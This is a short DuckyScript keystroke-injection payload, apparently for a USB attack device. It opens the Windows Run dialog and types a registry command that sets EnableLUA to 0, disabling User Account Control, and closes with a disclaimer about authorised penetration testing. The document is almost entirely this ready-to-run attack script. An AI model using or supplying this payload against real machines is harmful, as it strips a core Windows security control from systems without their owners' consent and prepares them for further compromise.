# Disabling UAC (User Account Control)

Disables User Account Control (UAC) by modifying the Windows registry.

```
DELAY 500
GUI r
DELAY 200
STRING reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f
ENTER
```

> Disclaimer: This script is for educational purposes and should only be used in environments where you have explicit authorization to perform penetration testing. Always follow ethical guidelines and laws governing cybersecurity practices.